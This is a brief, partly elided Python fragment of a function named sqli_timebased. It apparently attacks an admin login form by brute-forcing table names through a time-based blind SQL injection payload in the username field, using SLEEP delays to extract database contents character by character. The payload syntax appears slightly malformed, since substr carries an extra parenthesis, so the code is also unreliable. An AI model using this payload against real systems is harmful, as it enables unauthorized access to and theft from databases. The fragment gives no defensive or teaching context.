...
def sqli_timebased():
     ...
     for position in range(1, 100):         
         for character in characters:
             ...
             post_data = {
                     'op': 'adminlogin',
                     'username': "admin' AND IF(substr((select group_concat(table_name) from information_schema.tables where table_schema='admin')),%d,1)='%s',SLEEP(0.85),1)-- -" % (position, character),
                     'password': 'admin'
             }
